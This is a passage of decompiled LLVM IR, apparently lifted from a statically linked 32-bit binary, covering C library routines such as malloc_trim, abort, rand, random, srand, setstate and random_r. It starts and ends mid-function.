  store i32 %v4_8052ea8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052eb0

dec_label_pc_8052eb0:                             ; preds = %dec_label_pc_8052e6c, %dec_label_pc_8052e4b, %dec_label_pc_8052e7f, %dec_label_pc_8052d78, %dec_label_pc_8052e90
  store i32 %v2_8052d4b, i32* @eax, align 4
  %v2_8052eb9 = call i32 @__pthread_return_void(i32 %v2_8052d4b, i32 1)
  store i32 %v2_8052eb9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052ec1

dec_label_pc_8052ec1:                             ; preds = %entry, %dec_label_pc_8052eb0
  %.0 = phi i32 [ undef, %entry ], [ %v2_8052eb9, %dec_label_pc_8052eb0 ]
  store i32 %v0_8052d30, i32* @ebx, align 4
  store i32 %v0_8052d2f, i32* @esi, align 4
  store i32 %v0_8052d2e, i32* @edi, align 4
  store i32 %v0_8052d2d, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8052e90, { 1, 0 }
  uselistorder i32 %v0_8052e25, { 1, 0 }
  uselistorder i32 %v1_8052df0, { 1, 0 }
  uselistorder i32 %v2_8052de9, { 1, 0 }
  uselistorder i32 %v1_8052dde, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052ded, { 1, 0 }
  uselistorder i32 %v1_8052d71, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8052d6c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052d61, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_80678a0.731 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_80678d4.734 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_80678cc.732, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8061430.730 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8052ec1, { 1, 0 }
  uselistorder label %dec_label_pc_8052eb0, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8052e6c, { 1, 0 }
  uselistorder label %dec_label_pc_8052e4b, { 1, 0 }
  uselistorder label %dec_label_pc_8052e16, { 1, 0 }
  uselistorder label %dec_label_pc_8052e0e, { 1, 0 }
  uselistorder label %dec_label_pc_8052dda, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8052ec9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8052ed6 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_80678a0.731 to i8) to i32) to i32*))
  %v0_8052edb = load i32, i32* @ebx, align 4
  store i32 %v0_8052edb, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_80678a0.731 to i32), i32* @edx, align 4
  store i32 %v0_8052ec9, i32* @ebx, align 4
  %v0_8052ee6 = call i32 @__malloc_trim()
  ret i32 %v0_8052ee6

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_80678a0.731 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_80678a0.731, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8052ef8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061448.751 to i32))
  %v12_8052f02 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f07

dec_label_pc_8052f07:                             ; preds = %dec_label_pc_8052f07.dec_label_pc_8052f07_crit_edge, %entry
  %v0_8052f07 = phi i32 [ %v12_8052f02, %entry ], [ %v0_8052f07.pre, %dec_label_pc_8052f07.dec_label_pc_8052f07_crit_edge ]
  %v1_8052f1222 = phi i32 [ 31, %entry ], [ %v1_8052f12, %dec_label_pc_8052f07.dec_label_pc_8052f07_crit_edge ]
  %v2_8052f07 = mul i32 %v1_8052f1222, 4
  %v3_8052f07 = add i32 %v2_8052f07, 152
  %v4_8052f07 = add i32 %v3_8052f07, %v0_8052f07
  %v5_8052f07 = inttoptr i32 %v4_8052f07 to i32*
  store i32 0, i32* %v5_8052f07, align 4
  %v0_8052f12.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f12 = add i32 %v0_8052f12.pre, -1
  %v9_8052f12 = icmp slt i32 %v1_8052f12, 0
  store i32 %v1_8052f12, i32* %eax.global-to-local, align 4
  %v1_8052f13 = icmp eq i1 %v9_8052f12, false
  br i1 %v1_8052f13, label %dec_label_pc_8052f07.dec_label_pc_8052f07_crit_edge, label %dec_label_pc_8052f15

dec_label_pc_8052f07.dec_label_pc_8052f07_crit_edge: ; preds = %dec_label_pc_8052f07
  %v0_8052f07.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052f07

dec_label_pc_8052f15:                             ; preds = %dec_label_pc_8052f07
  %v0_8052f15 = load i32, i32* @ebx, align 4
  %v2_8052f19 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8052f19, i32* @ebx, align 4
  %v4_8052f21 = call i32 @__sigaddset(i32 %v2_8052f19, i32 6, i32 %v0_8052f15, i32 %v0_8052f15)
  store i32 %v4_8052f21, i32* %eax.global-to-local, align 4
  %v1_8052f29 = icmp eq i32 %v4_8052f21, 0
  %v1_8052f2b = icmp eq i1 %v1_8052f29, false
  br i1 %v1_8052f2b, label %dec_label_pc_8052f3b, label %dec_label_pc_8052f2d

dec_label_pc_8052f2d:                             ; preds = %dec_label_pc_8052f15
  %v3_8052f33 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8052f33 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8052f33, i32 0)
  store i32 %v4_8052f33, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f3b

dec_label_pc_8052f3b:                             ; preds = %dec_label_pc_8052f15, %dec_label_pc_8052f2d
  %v2_8052f734 = phi i32 [ %v4_8052f21, %dec_label_pc_8052f15 ], [ %v4_8052f33, %dec_label_pc_8052f2d ]
  %v0_8052f3b = load i8, i8* @global_var_80677c0.752, align 64
  %v1_8052f3b = icmp eq i8 %v0_8052f3b, 0
  %v1_8052f42 = icmp eq i1 %v1_8052f3b, false
  br i1 %v1_8052f42, label %dec_label_pc_8052f73, label %dec_label_pc_8052f44

dec_label_pc_8052f44:                             ; preds = %dec_label_pc_8052f3b
  store i8 1, i8* @global_var_80677c0.752, align 64
  br label %dec_label_pc_8052f4b

dec_label_pc_8052f4b:                             ; preds = %dec_label_pc_8052fb2, %dec_label_pc_8052f44
  %v1_8052f53 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061448.751 to i32))
  store i32 %v1_8052f53, i32* %eax.global-to-local, align 4
  %v1_8052f5f = call i32 @__raise(i32 6)
  store i32 %v1_8052f5f, i32* %eax.global-to-local, align 4
  %v1_8052f6b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061448.751 to i32))
  store i32 %v1_8052f6b, i32* %eax.global-to-local, align 4
  %v0_8052f73.pre = load i8, i8* @global_var_80677c0.752, align 64
  br label %dec_label_pc_8052f73

dec_label_pc_8052f73:                             ; preds = %dec_label_pc_8052f3b, %dec_label_pc_8052f4b
  %v2_8052f73 = phi i32 [ %v2_8052f734, %dec_label_pc_8052f3b ], [ %v1_8052f6b, %dec_label_pc_8052f4b ]
  %v0_8052f73 = phi i8 [ %v0_8052f3b, %dec_label_pc_8052f3b ], [ %v0_8052f73.pre, %dec_label_pc_8052f4b ]
  %v1_8052f73 = zext i8 %v0_8052f73 to i32
  %v3_8052f73 = and i32 %v2_8052f73, -256
  %v4_8052f73 = or i32 %v1_8052f73, %v3_8052f73
  store i32 %v4_8052f73, i32* %eax.global-to-local, align 4
  %v10_8052f78 = icmp eq i8 %v0_8052f73, 1
  %v1_8052f7a = icmp eq i1 %v10_8052f78, false
  br i1 %v1_8052f7a, label %dec_label_pc_8052fd4, label %dec_label_pc_8052f7c

dec_label_pc_8052f7c:                             ; preds = %dec_label_pc_8052f73
  store i8 2, i8* @global_var_80677c0.752, align 64
  %v2_8052f8b = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8052f8b, i32* %eax.global-to-local, align 4
  %v3_8052f90 = bitcast i32* %stack_var_-272 to i8*
  %v4_8052f90 = call i32 @__GI_memset(i8* %v3_8052f90, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052fa7

dec_label_pc_8052fa7:                             ; preds = %dec_label_pc_8052fa7.dec_label_pc_8052fa7_crit_edge, %dec_label_pc_8052f7c
  %v0_8052fa7 = phi i32 [ %v12_8052f02, %dec_label_pc_8052f7c ], [ %v0_8052fa7.pre, %dec_label_pc_8052fa7.dec_label_pc_8052fa7_crit_edge ]
  %v1_8052faf21 = phi i32 [ 31, %dec_label_pc_8052f7c ], [ %v1_8052faf, %dec_label_pc_8052fa7.dec_label_pc_8052fa7_crit_edge ]
  %v2_8052fa7 = mul i32 %v1_8052faf21, 4
  %v3_8052fa7 = add i32 %v2_8052fa7, 16
  %v4_8052fa7 = add i32 %v3_8052fa7, %v0_8052fa7
  %v5_8052fa7 = inttoptr i32 %v4_8052fa7 to i32*
  store i32 -1, i32* %v5_8052fa7, align 4
  %v0_8052faf.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8052faf = add i32 %v0_8052faf.pre, -1
  %v9_8052faf = icmp slt i32 %v1_8052faf, 0
  store i32 %v1_8052faf, i32* %eax.global-to-local, align 4
  %v1_8052fb0 = icmp eq i1 %v9_8052faf, false
  br i1 %v1_8052fb0, label %dec_label_pc_8052fa7.dec_label_pc_8052fa7_crit_edge, label %dec_label_pc_8052fb2

dec_label_pc_8052fa7.dec_label_pc_8052fa7_crit_edge: ; preds = %dec_label_pc_8052fa7
  %v0_8052fa7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052fa7

dec_label_pc_8052fb2:                             ; preds = %dec_label_pc_8052fa7
  store i32 %v2_8052f8b, i32* %eax.global-to-local, align 4
  %v4_8052fc7 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8052fc7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f4b

dec_label_pc_8052fd4:                             ; preds = %dec_label_pc_8052f73
  %v10_8052fd4 = icmp eq i8 %v0_8052f73, 2
  %v1_8052fd6 = icmp eq i1 %v10_8052fd4, false
  br i1 %v1_8052fd6, label %dec_label_pc_8052fe0, label %dec_label_pc_8052fe0.thread

dec_label_pc_8052fe0.thread:                      ; preds = %dec_label_pc_8052fd4
  store i8 3, i8* @global_var_80677c0.752, align 64
  br label %dec_label_pc_8052fe9

dec_label_pc_8052fe0:                             ; preds = %dec_label_pc_8052fd4
  %v9_8052fe0 = icmp eq i8 %v0_8052f73, 3
  %v1_8052fe7 = icmp eq i1 %v9_8052fe0, false
  br i1 %v1_8052fe7, label %dec_label_pc_8052ffa, label %dec_label_pc_8052fe9

dec_label_pc_8052fe9:                             ; preds = %dec_label_pc_8052fe0.thread, %dec_label_pc_8052fe0
  store i8 4, i8* @global_var_80677c0.752, align 64
  %v1_8052ff5 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8052ffa:                             ; preds = %dec_label_pc_8052fe0, %dec_label_pc_8052ffa
  br label %dec_label_pc_8052ffa

; uselistorder directives
  uselistorder i32 %v1_8052faf, { 2, 1, 0 }
  uselistorder i32 %v1_8052f12, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i8 3, { 0, 5, 1, 2, 4, 3 }
  uselistorder i8* @global_var_80677c0.752, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8052ffa, { 1, 0 }
  uselistorder label %dec_label_pc_8052fe9, { 1, 0 }
  uselistorder label %dec_label_pc_8052f73, { 1, 0 }
  uselistorder label %dec_label_pc_8052f3b, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8053000 = call i32 @random()
  ret i32 %v0_8053000

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 6, 7, 12, 1, 8, 4, 2, 3, 11, 5, 0, 10, 9 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053008 = load i32, i32* @ebx, align 4
  store i32 %v0_8053008, i32* %stack_var_-4, align 4
  %v2_8053016 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053016, i32* @ebx, align 4
  %v2_805301b = call i32 @__pthread_return_void(i32 %v2_8053016, i32 134560279)
  %v1_8053027 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061460.753 to i32))
  %v2_805302e = ptrtoint i32* %stack_var_-8 to i32
  %v3_8053038 = call i32 @__GI_random_r(i32* nonnull @global_var_8061478, i32 %v2_805302e)
  store i32 ptrtoint (i32* @global_var_8061478 to i32), i32* @eax, align 4
  %v2_8053042 = call i32 @__pthread_return_void(i32 %v2_8053016, i32 1)
  %v3_8053047 = load i32, i32* %stack_var_-8, align 4
  %v2_805304e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805304e, i32* @ebx, align 4
  ret i32 %v3_8053047
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8053061 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053061, i32* @eax, align 4
  %v2_8053066 = call i32 @__pthread_return_void(i32 %v2_8053061, i32 134560279)
  %v1_8053072 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061460.753 to i32))
  %v0_805307e = load i32, i32* bitcast (i32** @global_var_8061480.756 to i32*), align 128
  store i32 %v0_805307e, i32* @ebx, align 4
  %v3_8053088 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8061478)
  %v2_8053090 = icmp slt i32 %v3_8053088, 0
  br i1 %v2_8053090, label %dec_label_pc_8053097, label %dec_label_pc_8053094

dec_label_pc_8053094:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_806147c.757 to i32), i32* @esi, align 4
  br label %dec_label_pc_8053097

dec_label_pc_8053097:                             ; preds = %entry, %dec_label_pc_8053094
  store i32 %v2_8053061, i32* @eax, align 4
  %v2_80530a0 = call i32 @__pthread_return_void(i32 %v2_8053061, i32 1)
  %v0_80530a5 = load i32, i32* @esi, align 4
  ret i32 %v0_80530a5

; uselistorder directives
  uselistorder label %dec_label_pc_8053097, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_80530bc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80530bc, i32* @ebx, align 4
  %v2_80530c1 = call i32 @__pthread_return_void(i32 %v2_80530bc, i32 134560279)
  %v1_80530cd = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061460.753 to i32))
  %v0_80530d7 = load i32, i32* bitcast (i32** @global_var_8061480.756 to i32*), align 128
  store i32 %v0_80530d7, i32* @esi, align 4
  %v4_80530e9 = inttoptr i32 %arg2 to i32*
  %v5_80530e9 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_80530e9, i32 %arg3, i32 ptrtoint (i32* @global_var_8061478 to i32))
  store i32 %v5_80530e9, i32* @eax, align 4
  %v2_80530f4 = call i32 @__pthread_return_void(i32 %v2_80530bc, i32 1)
  ret i32 ptrtoint (i32** @global_var_806147c.757 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053104 = load i32, i32* @ebx, align 4
  store i32 %v0_8053104, i32* %stack_var_-4, align 4
  %v2_8053112 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8053112, i32* @ebx, align 4
  %v2_8053117 = call i32 @__pthread_return_void(i32 %v2_8053112, i32 134560279)
  %v1_8053123 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061460.753 to i32))
  %v2_8053133 = sext i32 %arg1 to i64
  %v3_8053133 = call i32 @srandom_r(i64 %v2_8053133, i32 ptrtoint (i32* @global_var_8061478 to i32))
  store i32 ptrtoint (i32* @global_var_8061478 to i32), i32* @eax, align 4
  %v2_805313d = call i32 @__pthread_return_void(i32 %v2_8053112, i32 1)
  %v2_8053145 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053145, i32* @ebx, align 4
  ret i32 %v2_805313d

; uselistorder directives
  uselistorder i32* @global_var_8061478, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8061478 to i32), { 1, 3, 2, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_805314b = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_8053157 = add i32 %arg1, 4
  store i32 %v1_8053157, i32* %esi.global-to-local, align 4
  %v1_805315a = add i32 %tmp4, 12
  %v2_805315a = inttoptr i32 %v1_805315a to i32*
  %v3_805315a = load i32, i32* %v2_805315a, align 4
  store i32 %v3_805315a, i32* %ecx.global-to-local, align 4
  %v1_805315d = add i32 %tmp4, 8
  %v2_805315d = inttoptr i32 %v1_805315d to i32*
  %v3_805315d = load i32, i32* %v2_805315d, align 4
  %v1_8053160 = icmp eq i32 %v3_805315a, 0
  %v1_8053162 = icmp eq i1 %v1_8053160, false
  br i1 %v1_8053162, label %dec_label_pc_805316d, label %dec_label_pc_8053164

dec_label_pc_8053164:                             ; preds = %entry
  %v1_8053164 = add i32 %v3_805315d, -4
  %v2_8053164 = inttoptr i32 %v1_8053164 to i32*
  store i32 0, i32* %v2_8053164, align 4
  br label %dec_label_pc_805317d

dec_label_pc_805316d:                             ; preds = %entry
  %v1_805316d = add i32 %tmp4, 4
  %v2_805316d = inttoptr i32 %v1_805316d to i32*
  %v3_805316d = load i32, i32* %v2_805316d, align 4
  %v2_8053170 = sub i32 %v3_805316d, %v3_805315d
  %v2_8053172 = sdiv i32 %v2_8053170, 4
  %v3_8053175 = mul i32 %v2_8053172, 5
  %v2_8053178 = add i32 %v3_8053175, %v3_805315a
  store i32 %v2_8053178, i32* %eax.global-to-local, align 4
  %v2_805317a = add i32 %v3_805315d, -4
  %v3_805317a = inttoptr i32 %v2_805317a to i32*
  store i32 %v2_8053178, i32* %v3_805317a, align 4
  br label %dec_label_pc_805317d

dec_label_pc_805317d:                             ; preds = %dec_label_pc_8053164, %dec_label_pc_805316d
  %v0_805317d = load i32, i32* %esi.global-to-local, align 4
  %v1_805317d = add i32 %v0_805317d, -4
  %v2_805317d = inttoptr i32 %v1_805317d to i32*
  %v3_805317d = load i32, i32* %v2_805317d, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8053185 = ashr i32 %v3_805317d, 31
  %v2_8053186 = zext i32 %v3_805317d to i64
  %v4_8053186 = zext i32 %v1_8053185 to i64
  %v5_8053186 = mul nuw i64 %v4_8053186, 4294967296
  %v6_8053186 = or i64 %v5_8053186, %v2_8053186
  %v8_8053186 = sdiv i64 %v6_8053186, 5
  %v9_8053186 = trunc i64 %v8_8053186 to i32
  store i32 %v9_8053186, i32* %eax.global-to-local, align 4
  %v10_8053186 = srem i64 %v6_8053186, 5
  %v11_8053186 = trunc i64 %v10_8053186 to i32
  %v6_805318b = icmp ugt i32 %v11_8053186, 4
  br i1 %v6_805318b, label %dec_label_pc_80531cb, label %dec_label_pc_805318d

dec_label_pc_805318d:                             ; preds = %dec_label_pc_805317d
  %v1_805318d = mul i32 %v11_8053186, 4
  %v2_805318d = add i32 %v1_805318d, ptrtoint (i32* @global_var_80608d4.758 to i32)
  %v3_805318d = inttoptr i32 %v2_805318d to i32*
  %v4_805318d = load i32, i32* %v3_805318d, align 4
  store i32 %v4_805318d, i32* %ecx.global-to-local, align 4
  %v2_8053194 = add i32 %v1_805318d, ptrtoint (i32* @global_var_80608c0.759 to i32)
  %v3_8053194 = inttoptr i32 %v2_8053194 to i32*
  %v4_8053194 = load i32, i32* %v3_8053194, align 4
  store i32 %v4_8053194, i32* %ebp.global-to-local, align 4
  %v1_805319b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805319b = add i32 %v1_805319b, 16
  %v3_805319b = inttoptr i32 %v2_805319b to i32*
  store i32 %v4_805318d, i32* %v3_805319b, align 4
  %v0_805319e = load i32, i32* %ebp.global-to-local, align 4
  %v1_805319e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805319e = add i32 %v1_805319e, 20
  %v3_805319e = inttoptr i32 %v2_805319e to i32*
  store i32 %v0_805319e, i32* %v3_805319e, align 4
  %v1_80531a1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80531a1 = add i32 %v1_80531a1, 12
  %v3_80531a1 = inttoptr i32 %v2_80531a1 to i32*
  store i32 %v11_8053186, i32* %v3_80531a1, align 4
  %v1_80531a4 = icmp eq i32 %v11_8053186, 0
  br i1 %v1_80531a4, label %dec_label_pc_80531be, label %dec_label_pc_80531a8

dec_label_pc_80531a8:                             ; preds = %dec_label_pc_805318d
  %v0_80531a8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80531a8 = add i32 %v0_80531a8, -4
  %v2_80531a8 = inttoptr i32 %v1_80531a8 to i32*
  %v3_80531a8 = load i32, i32* %v2_80531a8, align 4
  %v1_80531ab = ashr i32 %v3_80531a8, 31
  %v0_80531ac = load i32, i32* %edi.global-to-local, align 4
  %v2_80531ac = zext i32 %v3_80531a8 to i64
  %v4_80531ac = zext i32 %v1_80531ab to i64
  %v5_80531ac = mul nuw i64 %v4_80531ac, 4294967296
  %v6_80531ac = or i64 %v5_80531ac, %v2_80531ac
  %v7_80531ac = zext i32 %v0_80531ac to i64
  %v8_80531ac = sdiv i64 %v6_80531ac, %v7_80531ac
  %v9_80531ac = trunc i64 %v8_80531ac to i32
  %v2_80531ae = mul i32 %v9_80531ac, 4
  %v3_80531ae = add i32 %v2_80531ae, %v0_80531a8
  %v1_80531b1 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80531b1 = add i32 %v1_80531b1, %v9_80531ac
  store i32 %v2_80531b1, i32* %eax.global-to-local, align 4
  %v1_80531b3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80531b3 = add i32 %v1_80531b3, 4
  %v3_80531b3 = inttoptr i32 %v2_80531b3 to i32*
  store i32 %v3_80531ae, i32* %v3_80531b3, align 4
  %v0_80531b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80531b6 = ashr i32 %v0_80531b6, 31
  %v0_80531b7 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80531b7 = zext i32 %v0_80531b6 to i64
  %v4_80531b7 = zext i32 %v1_80531b6 to i64
  %v5_80531b7 = mul nuw i64 %v4_80531b7, 4294967296
  %v6_80531b7 = or i64 %v5_80531b7, %v2_80531b7
  %v7_80531b7 = zext i32 %v0_80531b7 to i64
  %v8_80531b7 = sdiv i64 %v6_80531b7, %v7_80531b7
  %v9_80531b7 = trunc i64 %v8_80531b7 to i32
  store i32 %v9_80531b7, i32* %eax.global-to-local, align 4
  %v10_80531b7 = srem i64 %v6_80531b7, %v7_80531b7
  %v11_80531b7 = trunc i64 %v10_80531b7 to i32
  %v0_80531b9 = load i32, i32* %esi.global-to-local, align 4
  %v2_80531b9 = mul i32 %v11_80531b7, 4
  %v3_80531b9 = add i32 %v2_80531b9, %v0_80531b9
  %v1_80531bc = load i32, i32* %ebx.global-to-local, align 4
  %v2_80531bc = inttoptr i32 %v1_80531bc to i32*
  store i32 %v3_80531b9, i32* %v2_80531bc, align 4
  br label %dec_label_pc_80531be

dec_label_pc_80531be:                             ; preds = %dec_label_pc_805318d, %dec_label_pc_80531a8
  %v0_80531be = load i32, i32* %esi.global-to-local, align 4
  %v1_80531be = load i32, i32* %ecx.global-to-local, align 4
  %v2_80531be = mul i32 %v1_80531be, 4
  %v3_80531be = add i32 %v2_80531be, %v0_80531be
  store i32 %v3_80531be, i32* %eax.global-to-local, align 4
  %v1_80531c1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80531c1 = add i32 %v1_80531c1, 8
  %v3_80531c1 = inttoptr i32 %v2_80531c1 to i32*
  store i32 %v0_80531be, i32* %v3_80531c1, align 4
  %v0_80531c4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80531c4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80531c4 = add i32 %v1_80531c4, 24
  %v3_80531c4 = inttoptr i32 %v2_80531c4 to i32*
  store i32 %v0_80531c4, i32* %v3_80531c4, align 4
  br label %dec_label_pc_80531d9

dec_label_pc_80531cb:                             ; preds = %dec_label_pc_805317d
  %v1_80531cb = call i32 @__errno_location(i32 %v0_805314b)
  store i32 %v1_80531cb, i32* %eax.global-to-local, align 4
  %v1_80531d0 = inttoptr i32 %v1_80531cb to i32*
  store i32 22, i32* %v1_80531d0, align 4
  br label %dec_label_pc_80531d9

dec_label_pc_80531d9:                             ; preds = %dec_label_pc_80531be, %dec_label_pc_80531cb
  %storemerge = phi i32 [ -1, %dec_label_pc_80531cb ], [ 0, %dec_label_pc_80531be ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805314b, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_80531be, { 1, 0 }
  uselistorder i32 %v11_8053186, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_80531d9, { 1, 0 }
  uselistorder label %dec_label_pc_80531be, { 1, 0 }
  uselistorder label %dec_label_pc_805317d, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_80531e4 = load i32, i32* @ebx, align 4
  store i32 %v0_80531e4, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_80531ed = add i32 %tmp2, 8
  %v2_80531ed = inttoptr i32 %v1_80531ed to i32*
  %v3_80531ed = load i32, i32* %v2_80531ed, align 4
  store i32 %v3_80531ed, i32* %esi.global-to-local, align 4
  %v1_80531f0 = add i32 %tmp2, 12
  %v2_80531f0 = inttoptr i32 %v1_80531f0 to i32*
  %v3_80531f0 = load i32, i32* %v2_80531f0, align 4
  %v4_80531f0 = icmp eq i32 %v3_80531f0, 0
  %v1_80531f4 = icmp eq i1 %v4_80531f0, false
  br i1 %v1_80531f4, label %dec_label_pc_805320d, label %dec_label_pc_80531f6

dec_label_pc_80531f6:                             ; preds = %entry
  %v2_80531f6 = inttoptr i32 %v3_80531ed to i32*
  %v3_80531f6 = load i32, i32* %v2_80531f6, align 4
  %v5_80531f6 = mul i32 %v3_80531f6, 1103515245
  %v1_80531fc = add i32 %v5_80531f6, 12345
  %v1_8053201 = urem i32 %v1_80531fc, -2147483648
  store i32 %v1_8053201, i32* %eax.global-to-local, align 4
  store i32 %v1_8053201, i32* %v2_80531f6, align 4
  %v0_8053208 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053208 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053208 = inttoptr i32 %v1_8053208 to i32*
  store i32 %v0_8053208, i32* %v2_8053208, align 4
  br label %dec_label_pc_8053239

dec_label_pc_805320d:                             ; preds = %entry
  %v1_805320d = add i32 %tmp2, 4
  %v2_805320d = inttoptr i32 %v1_805320d to i32*
  %v3_805320d = load i32, i32* %v2_805320d, align 4
  store i32 %v3_805320d, i32* %ecx.global-to-local, align 4
  %v2_8053210 = load i32, i32* %arg1, align 4
  store i32 %v2_8053210, i32* %edx.global-to-local, align 4
  %v1_8053212 = add i32 %tmp2, 24
  %v2_8053212 = inttoptr i32 %v1_8053212 to i32*
  %v3_8053212 = load i32, i32* %v2_8053212, align 4
